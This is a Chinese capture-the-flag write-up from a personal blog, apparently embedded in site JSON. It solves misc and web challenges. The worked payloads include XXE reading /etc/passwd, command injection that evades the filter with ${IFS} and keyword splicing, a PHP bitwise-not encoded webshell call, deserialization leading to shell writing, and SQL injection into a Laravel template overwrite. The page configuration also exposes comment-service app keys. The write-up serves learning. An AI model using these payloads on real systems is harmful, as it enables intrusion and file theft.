alt=\"\"><br>ok,已经可以任意文件读取了<br>尝试读取flag.php的时候发现一直读取失败，百思不得其解，web访问也的确存在，队友用php伪协议拿到了<br><img src=\"/img/2019-09-11/img_8.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>flag{IUyasd8213123123890}</p>\n<h6 id=\"免费的-ping一下\"><a href=\"#免费的-ping一下\" class=\"headerlink\" title=\"免费的,ping一下~\"></a>免费的,ping一下~</h6><p>题目描述：听说ping很好玩~<br>考察命令执行，过滤了<code>&lt;</code>，<code>&gt;</code>，<code>&amp;</code>，<code>|</code>，<code>空格</code>，<code>%0*</code>，还有一些关键字可以用拼接的方法绕过，可以用<code>${IFS}</code>替换空格，<code>$a=ca;$b=t;$a$b</code>这样的方法来绕过关键字，然后这道题用cat是cat不到flag的，返回的内容有限，所以查到可以用sed查看指定的行<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">A</span>=;a=fl;b=ag;se<span class=\"hljs-string\">\"\"</span>d<span class=\"hljs-variable\">$&#123;IFS&#125;</span>-n<span class=\"hljs-variable\">$&#123;IFS&#125;</span><span class=\"hljs-string\">'16,18p'</span><span class=\"hljs-variable\">$&#123;IFS&#125;</span>/<span class=\"hljs-variable\">$a</span><span class=\"hljs-variable\">$b</span></code></pre></p>\n<p><img src=\"/img/2019-09-11/img_9.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>flag{llllll_U_GeT_Th3_fl4g}</p>\n<h6 id=\"php\"><a href=\"#php\" class=\"headerlink\" title=\"php\"></a>php</h6><p>题目描述：PHP是世界上最…..的语言<br>扫描得到<code>index.php</code><br><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>\nerror_reporting(E_ALL^E_NOTICE^E_WARNING);\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">GetYourFlag</span><span class=\"hljs-params\">()</span></span>&#123;\n    <span class=\"hljs-keyword\">echo</span> file_get_contents(<span class=\"hljs-string\">\"./flag.php\"</span>);\n&#125;\n\n<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>($_GET[<span class=\"hljs-string\">'code'</span>]))&#123;\n    $code = $_GET[<span class=\"hljs-string\">'code'</span>];\n    <span class=\"hljs-comment\">//print(strlen($code));</span>\n    <span class=\"hljs-keyword\">if</span>(strlen($code)&gt;<span class=\"hljs-number\">27</span>)&#123; \n        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">\"Too Long.\"</span>);\n    &#125;\n\n    <span class=\"hljs-keyword\">if</span>(preg_match(<span class=\"hljs-string\">'/[a-zA-Z0-9_&amp;^&lt;&gt;\"\\']+/'</span>,$_GET[<span class=\"hljs-string\">'code'</span>])) &#123;\n        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">\"Not Allowed.\"</span>);\n    &#125;\n    @<span class=\"hljs-keyword\">eval</span>($_GET[<span class=\"hljs-string\">'code'</span>]);\n&#125;<span class=\"hljs-keyword\">else</span>&#123;\n      highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);\n&#125;\n<span class=\"hljs-meta\">?&gt;</span></code></pre></p>\n<p>这是一个无字符马，可以参考freebuf上的一篇文章–&gt;<a href=\"https://www.freebuf.com/articles/web/186298.html\" target=\"_blank\" rel=\"noopener\">传送门</a>，这是php7的一个解析特性，简单来说就是通过和<code>~</code>符号异或出我们需要的字符。<br><pre><code class=\"hljs undefined\">(~<span class=\"hljs-symbol\">%8</span>F<span class=\"hljs-symbol\">%97</span><span class=\"hljs-symbol\">%8</span>F<span class=\"hljs-symbol\">%96</span><span class=\"hljs-symbol\">%91</span><span class=\"hljs-symbol\">%99</span><span class=\"hljs-symbol\">%90</span>)()<span class=\"hljs-comment\">;</span></code></pre></p>\n<p>这个是phpinfo();的一个payload，可以看到webshell是可以成功执行的<br><img src=\"/img/2019-09-11/img_10.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>然后上面也给了getflag的函数我们，直接调用就可以了<br><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>\n$a = urlencode(~<span class=\"hljs-string\">'GetYourFlag'</span>);\n<span class=\"hljs-keyword\">echo</span> $a;\n<span class=\"hljs-comment\">//%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98</span></code></pre></p>\n<p>payload为<code>(~%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98)();</code><br><img src=\"/img/2019-09-11/img_11.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>flag{3904c5df2e894ca02a21004feb21e617}<br>备注：php是世界上最好的语言hah</p>\n<h6 id=\"API\"><a href=\"#API\" class=\"headerlink\" title=\"API\"></a>API</h6><p>题目描述：API<br>打开提示<code>Api!wow</code>，访问api目录提示<br><img src=\"/img/2019-09-11/img_12.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>提示<code>post filename</code>和传入一个数组，不赋值时候提示<code>json_decode error</code>,固传入一个json数组，盲猜file参数。结果正确<br><img src=\"/img/2019-09-11/img_13.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>在这里浪费了很多时间来绕过stristr，发现是绕不过的。然后读取../index.php<br><img src=\"/img/2019-09-11/img_14.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>得到源码，看了下，是反序列化。把hack.php也读出来<br><img src=\"/img/2019-09-11/img_15.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>看来没错了。通过反序列化来读取fffffaa_not.php这个文件源码。(<a href=\"https://www.freebuf.com/articles/web/167721.html\" target=\"_blank\" rel=\"noopener\">小声bb</a>:<a href=\"https://www.cnblogs.com/pureqh/p/10161993.html?tdsourcetag=s_pctim_aiomsg\" target=\"_blank\" rel=\"noopener\">全都是网上原题</a>)<br>通过../index.php的过滤条件可以构造出反序列化的字符串<br><pre><code class=\"hljs undefined\"><span class=\"hljs-selector-tag\">O</span><span class=\"hljs-selector-pseudo\">:+4</span><span class=\"hljs-selector-pseudo\">:\"hack\"</span><span class=\"hljs-selector-pseudo\">:1</span>:&#123;<span class=\"hljs-attribute\">s</span>:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"file\"</span>;<span class=\"hljs-attribute\">s</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-string\">\"fffffaa_not.php\"</span>;&#125;</code></pre></p>\n<p>发送的时候需要url编码一下。然后得到源码fffffaa_not.php<br><img src=\"/img/2019-09-11/img_16.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>是一个写shell的功能。其中判断规则preg_match(‘[&lt;&gt;?]’, $text)。<br>这个绕过很简单了，变成数组就可以了。参考–&gt;<a href=\"https://blog.stkusami.com/archives/56\" target=\"_blank\" rel=\"noopener\">传送门</a><br><img src=\"/img/2019-09-11/img_17.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>成了，直接getshell拿flag<br><img src=\"/img/2019-09-11/img_18.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>flag{Oiahhh1_iiu123}</p>\n<h6 id=\"找漏洞\"><a href=\"#找漏洞\" class=\"headerlink\" title=\"找漏洞\"></a>找漏洞</h6><p>题目描述：小明失恋后写了一个CMS，你能帮他找找漏洞吗？<br>这道题大佬做出来了，我就学习一波。<br>根据题目给出的源码包，程序是laravel 框架写的，这套框架和Django的编程思想差不多。不懂的可以先去看看 laravel 框架的设计逻辑。<br>首先审计一下路由有什么可以用的。<br><img src=\"/img/2019-09-11/img_19.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>可以看到有5个路由。漏洞入口点是第一个路由user_testpage/{id}，其余的都要登陆后才能使用。在App\\Http\\Controllers\\UserController 里面的index方法。<br><img src=\"/img/2019-09-11/img_20.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>可以看到有个注入，只是简单的替换了关键字。直接sqlmap跑。Dump出数据<br><img src=\"/img/2019-09-11/img_21.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>可以看到有3条数据。刚开始尝试了暴力破解等方法。都没成功。随后在github上找了hash对比的工具，刚开始并不顺利，全部hash都是false。接着翻源码的时候意外发现一个password，在\\backup\\database\\factories\\UserFactory.php<br><img src=\"/img/2019-09-11/img_22.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>总感觉后面的注释是密码。一试果然成功。数据库里面前两个的password都是假的……<br><img src=\"/img/2019-09-11/img_23.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>登陆后台之后，就直接跳到上传吧<br><img src=\"/img/2019-09-11/img_24.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>首先带着cookie访问<code>http://119.61.19.212:8085/home/uploadto_upload</code>，会得到一个html<br><img src=\"/img/2019-09-11/img_25.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>意思是按照这个格式构造上传包。这里需要改改。Action填入的是<code>http://119.61.19.212:8085/home/uploadss/NotAllow6171</code>,<code>files</code>标签也要改。改成符合上传包的格式,这里需要注意<code>uploadss</code>后面是需要跟一个key，key从哪里来?回头看看数据库第二条。<br><img src=\"/img/2019-09-11/img_26.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br><del>首先这里……十分恶心</del>。刚开始一直以为上传点是不行的。然后我在源码注意到了<code>template.blade.php</code>。才把文件名改成template.blade.php 。然后在哪触发呢？blade框架中是类似于一个模板，需要在Controller中用view的方法展现。所以刚好ProfileController.php 中view了。所以就可以通过此方法覆盖php文件啦<br><img src=\"/img/2019-09-11/img_27.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>但是回到上传那里，虽然不拦截后缀。却不能上传新文件，也不能覆盖php代码进去，所以这里可以利用框架特性。template.blade.php是个模板文件。有特有的语法。经别人点化后在源码中其实有一个文件读取<br><img src=\"/img/2019-09-11/img_28.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>这个怎么用呢，看下图吧<br><img src=\"/img/2019-09-11/img_29.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>构造post包发送<br><img src=\"/img/2019-09-11/img_30.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>访问<code>http://119.61.19.212:8085/home/profile</code>出flag<br><img src=\"/img/2019-09-11/img_31.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>flag{Ucan_wow_easy_qaq}</p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<p>这个比赛是想好好打的，第一天还好，项目做完了专心打了大半天，下午到快晚上的时候又有事情，导致后面就大概看了一下，没有怎么投入，不过这次比赛<del>脑洞</del>难度不算太大，做的还算不错。<br>","more":"</p>\n<h5 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h5><h6 id=\"完美的错误\"><a href=\"#完美的错误\" class=\"headerlink\" title=\"完美的错误\"></a>完美的错误</h6><p>题目描述：小明在实现避免字符混淆的编码算法时,不小心错位了数组，你能帮他还原代码吗？<code>RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX</code><br>关键点：避免字符混淆<br>这个提示是与base58编码有关，base58与base64的区别参考先知社区的一篇文章–&gt;<a href=\"https://xz.aliyun.com/t/2255\" target=\"_blank\" rel=\"noopener\">传送门</a><br>错位了数组应该是数字和字母换了位置，直接用哪里的代码改一下就出来了<br><pre><code class=\"hljs python\"><span class=\"hljs-comment\">#-*-coding:utf-8</span>\n__b58chars = <span class=\"hljs-string\">'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789'</span> <span class=\"hljs-comment\">#这里原本是123456789A-Za-z的</span>\n__b58base = len(__b58chars)\n\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">b58encode</span><span class=\"hljs-params\">(v)</span>:</span>\n    <span class=\"hljs-string\">\"\"\" encode v, which is a string of bytes, to base58.\n    \"\"\"</span>\n\n    long_value = int(v.encode(<span class=\"hljs-string\">\"hex_codec\"</span>), <span class=\"hljs-number\">16</span>)\n\n    result = <span class=\"hljs-string\">''</span>\n    <span class=\"hljs-keyword\">while</span> long_value &gt;= __b58base:\n        div, mod = divmod(long_value, __b58base)\n        result = __b58chars[mod] + result\n        long_value = div\n    result = __b58chars[long_value] + result\n\n    <span class=\"hljs-comment\"># Bitcoin does a little leading-zero-compression:</span>\n    <span class=\"hljs-comment\"># leading 0-bytes in the input become leading-1s</span>\n    nPad = <span class=\"hljs-number\">0</span>\n    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> v:\n        <span class=\"hljs-keyword\">if</span> c == <span class=\"hljs-string\">'\\0'</span>:\n            nPad += <span class=\"hljs-number\">1</span>\n        <span class=\"hljs-keyword\">else</span>:\n            <span class=\"hljs-keyword\">break</span>\n\n    <span class=\"hljs-keyword\">return</span> (__b58chars[<span class=\"hljs-number\">0</span>] * nPad) + result\n\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">b58decode</span><span class=\"hljs-params\">(v)</span>:</span>\n    <span class=\"hljs-string\">\"\"\" decode v into a string of len bytes\n    \"\"\"</span>\n\n    long_value = <span class=\"hljs-number\">0L</span>\n    <span class=\"hljs-keyword\">for</span> (i, c) <span class=\"hljs-keyword\">in</span> enumerate(v[::<span class=\"hljs-number\">-1</span>]):\n        long_value += __b58chars.find(c) * (__b58base ** i)\n\n    result = <span class=\"hljs-string\">''</span>\n    <span class=\"hljs-keyword\">while</span> long_value &gt;= <span class=\"hljs-number\">256</span>:\n        div, mod = divmod(long_value, <span class=\"hljs-number\">256</span>)\n        result = chr(mod) + result\n        long_value = div\n    result = chr(long_value) + result\n\n    nPad = <span class=\"hljs-number\">0</span>\n    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> v:\n        <span class=\"hljs-keyword\">if</span> c == __b58chars[<span class=\"hljs-number\">0</span>]:\n            nPad += <span class=\"hljs-number\">1</span>\n        <span class=\"hljs-keyword\">else</span>:\n            <span class=\"hljs-keyword\">break</span>\n\n    result = chr(<span class=\"hljs-number\">0</span>) * nPad + result\n    <span class=\"hljs-keyword\">return</span> result\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    <span class=\"hljs-comment\"># print  b58encode(\"hello world\")</span>\n    <span class=\"hljs-keyword\">print</span>  b58decode(<span class=\"hljs-string\">\"RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX\"</span>)</code></pre></p>\n<p>flag{adb88f7b70a20983833a7615fb103e01}</p>\n<h6 id=\"撸啊撸\"><a href=\"#撸啊撸\" class=\"headerlink\" title=\"撸啊撸\"></a>撸啊撸</h6><p>用winhex搜索png文件尾发现后面多了东西，提取出来后发现是一段程序，但是文件头损坏了，<code>__mh_execute_header</code>、<code>/usr/lib/libSystem.B.dylib</code>这些都是mach-o的可执行文件格式<del>别问我为什么知道，都是大佬发现的，我只是个复读机</del>，修复文件头如下，找到一个有例子的文章可以参考–&gt;<a href=\"https://www.jianshu.com/p/07f361f6e0d0\" target=\"_blank\" rel=\"noopener\">传送门</a><br><img src=\"/img/2019-09-11/img_1.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><img src=\"/img/2019-09-11/img_2.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>程序关键伪代码如下<br><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#start</span>\n__<span class=\"hljs-function\">int64 <span class=\"hljs-title\">start</span><span class=\"hljs-params\">()</span>\n</span>&#123;\n  __int64 result; <span class=\"hljs-comment\">// rax</span>\n  <span class=\"hljs-keyword\">char</span> v1; <span class=\"hljs-comment\">// [rsp+10h] [rbp-30h]</span>\n  __int64 v2; <span class=\"hljs-comment\">// [rsp+38h] [rbp-8h]</span>\n\n  <span class=\"hljs-built_in\">strcpy</span>(&amp;v1, <span class=\"hljs-string\">\"938gce1`872db99db`b342d23c0g9g2d\"</span>);\n  <span class=\"hljs-keyword\">if</span> ( v1 == <span class=\"hljs-number\">48</span> )\n    sub_100000E40(&amp;v1);\n  result = __stack_chk_guard;\n  <span class=\"hljs-keyword\">if</span> ( __stack_chk_guard == v2 )\n    result = <span class=\"hljs-number\">0L</span>L;\n  <span class=\"hljs-keyword\">return</span> result;\n&#125;\n#sub_100000E40\n<span class=\"hljs-keyword\">int</span> __<span class=\"hljs-function\">fastcall <span class=\"hljs-title\">sub_100000E40</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">const</span> <span class=\"hljs-keyword\">char</span> *a1)</span>\n</span>&#123;\n  <span class=\"hljs-keyword\">int</span> i; <span class=\"hljs-comment\">// [rsp+14h] [rbp-Ch]</span>\n\n  <span class=\"hljs-keyword\">for</span> ( i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-built_in\">strlen</span>(a1); ++i )\n    a1[i] ^= <span class=\"hljs-number\">1u</span>;\n  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"flag为:%s\\n\"</span>, a1);\n&#125;</code></pre></p>\n<pre><code class=\"hljs python\">code = <span class=\"hljs-string\">'938gce1`872db99db`b342d23c0g9g2d'</span>\ntext = <span class=\"hljs-string\">''</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> code:\n    text += chr(ord(i)^<span class=\"hljs-number\">1</span>)\n<span class=\"hljs-keyword\">print</span> text\n<span class=\"hljs-comment\">#829fbd0a963ec88ecac253e32b1f8f3e</span></code></pre>\n<p>flag{829fbd0a963ec88ecac253e32b1f8f3e}</p>\n<h6 id=\"脑筋急转弯\"><a href=\"#脑筋急转弯\" class=\"headerlink\" title=\"脑筋急转弯\"></a>脑筋急转弯</h6><p>下载回来是一个wav音频文件，没发现摩斯频谱也没发现什么就卡住了，后来队友说用<code>SilentEye</code>可以提取出一个zip文件<del>我去还有这操作</del><br><img src=\"/img/2019-09-11/img_3.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>然后爆破出密码<br><img src=\"/img/2019-09-11/img_4.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>得到一堆012012012又卡住了，后来某位大佬把0-&gt;<code>.</code>,1-&gt;<code>!</code>,2-&gt;<code>?</code>然后得到<code>Ook</code>码，然后<code>Ook</code>转<code>Brainfuck</code>转<code>text</code>然后就解出来了O_o..(空格要去掉)<br><pre><code class=\"hljs undefined\">lalala,wo <span class=\"hljs-keyword\">shi </span>mai <span class=\"hljs-keyword\">bao </span>de xiao hang <span class=\"hljs-keyword\">jia.flag&#123;08277716193eda6c592192966e9d6f39&#125; </span>ni neng cai dao ta me?</code></pre></p>\n<p>flag{08277716193eda6c592192966e9d6f39}</p>\n<h5 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h5><h6 id=\"小明又被拒绝了\"><a href=\"#小明又被拒绝了\" class=\"headerlink\" title=\"小明又被拒绝了\"></a>小明又被拒绝了</h6><p>题目描述：小明又被拒绝了，你能帮助他吗？<br>抓包添加请求头<code>X-Forwarded-For: 127.0.0.1</code>和把admin改为1<br><img src=\"/img/2019-09-11/img_5.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>flag{xxasdasdd_for}</p>\n<h6 id=\"XX\"><a href=\"#XX\" class=\"headerlink\" title=\"XX?\"></a>XX?</h6><p>题目描述：XXXXX？？？<br>联想到XXE，扫描得到<code>index.php</code>和<code>flag.php</code>文件，扫描备份文件得到<code>index.php~</code>文件<br><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>\n<span class=\"hljs-comment\">#鍏抽棴Warning</span>\nerror_reporting(E_ALL^E_NOTICE^E_WARNING);\n\n$xmlfile = file_get_contents(<span class=\"hljs-string\">'php://input'</span>);\n$dom = <span class=\"hljs-keyword\">new</span> DOMDocument();\n$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n\n$creds = simplexml_import_dom($dom);\n$user = $creds-&gt;user;\n$pass = $creds-&gt;pass;\n\n<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"CTF:\"</span> . <span class=\"hljs-string\">\"&lt;br&gt;\"</span> . <span class=\"hljs-string\">\"$user\"</span>;\n<span class=\"hljs-meta\">?&gt;</span></code></pre></p>\n<p>POST上去一个xxe的payload<br><pre><code class=\"hljs xml\"><span class=\"php\"><span class=\"hljs-meta\">&lt;?</span>xml version=<span class=\"hljs-string\">\"1.0\"</span><span class=\"hljs-meta\">?&gt;</span></span>\n<span class=\"hljs-meta\">&lt;!DOCTYPE note[\n&lt;!ELEMENT note (user)&gt;\n&lt;!ENTITY hack3r \"Hu3sky\"&gt;\n]&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">note</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">user</span>&gt;</span>&amp;hack3r;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">user</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">note</span>&gt;</span></code></pre></p>\n<p><img src=\"/img/2019-09-11/img_6.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>成了，有戏，试着读了一下<code>/etc/passwd</code>文件<br><img src=\"/img/2019-09-11/img_7.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>ok,已经可以任意文件读取了<br>尝试读取flag.php的时候发现一直读取失败，百思不得其解，web访问也的确存在，队友用php伪协议拿到了<br><img src=\"/img/2019-09-11/img_8.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>flag{IUyasd8213123123890}</p>\n<h6 id=\"免费的-ping一下\"><a href=\"#免费的-ping一下\" class=\"headerlink\" title=\"免费的,ping一下~\"></a>免费的,ping一下~</h6><p>题目描述：听说ping很好玩~<br>考察命令执行，过滤了<code>&lt;</code>，<code>&gt;</code>，<code>&amp;</code>，<code>|</code>，<code>空格</code>，<code>%0*</code>，还有一些关键字可以用拼接的方法绕过，可以用<code>${IFS}</code>替换空格，<code>$a=ca;$b=t;$a$b</code>这样的方法来绕过关键字，然后这道题用cat是cat不到flag的，返回的内容有限，所以查到可以用sed查看指定的行<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">A</span>=;a=fl;b=ag;se<span class=\"hljs-string\">\"\"</span>d<span class=\"hljs-variable\">$&#123;IFS&#125;</span>-n<span class=\"hljs-variable\">$&#123;IFS&#125;</span><span class=\"hljs-string\">'16,18p'</span><span class=\"hljs-variable\">$&#123;IFS&#125;</span>/<span class=\"hljs-variable\">$a</span><span class=\"hljs-variable\">$b</span></code></pre></p>\n<p><img src=\"/img/2019-09-11/img_9.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>flag{llllll_U_GeT_Th3_fl4g}</p>\n<h6 id=\"php\"><a 